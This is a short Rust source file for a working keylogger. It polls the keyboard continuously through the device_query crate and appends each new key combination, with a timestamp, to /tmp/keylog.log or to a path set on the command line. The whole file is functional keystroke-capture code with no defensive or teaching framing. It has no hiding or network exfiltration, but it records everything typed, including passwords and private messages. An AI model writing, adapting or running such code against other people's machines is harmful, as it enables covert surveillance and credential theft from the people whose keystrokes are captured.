use std::io::Write;
use chrono::prelude::*;
use std::fs::OpenOptions;
use clap::{App, load_yaml};
use device_query::{DeviceQuery, DeviceState, keymap};


fn main() {
    let yaml = load_yaml!("cli.yaml");
    let matches = App::from_yaml(yaml).get_matches();
    let mut fp = String::from("/tmp/keylog.log");
    if matches.is_present("path") {
        fp = matches.value_of("path")
            .unwrap()
            .to_string();
    }

    let device_state = DeviceState::new();
    let mut temp = Vec::new();
    
    loop {
        let keys = device_state.get_keys();
        if keys != temp && !keys.is_empty() {
            log_keystroke(&fp, &keys);
        }
        temp = keys;
    }
}

pub fn log_keystroke(file_path: &String, key: &Vec<keymap::Keycode>) {
    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open(file_path)
        .expect("Cannot open file at given path");
    
    let local_time = Local::now();
    writeln!(file, "{:?}\t\t{:?}", local_time, key)
        .expect("Failed to write to file");
}
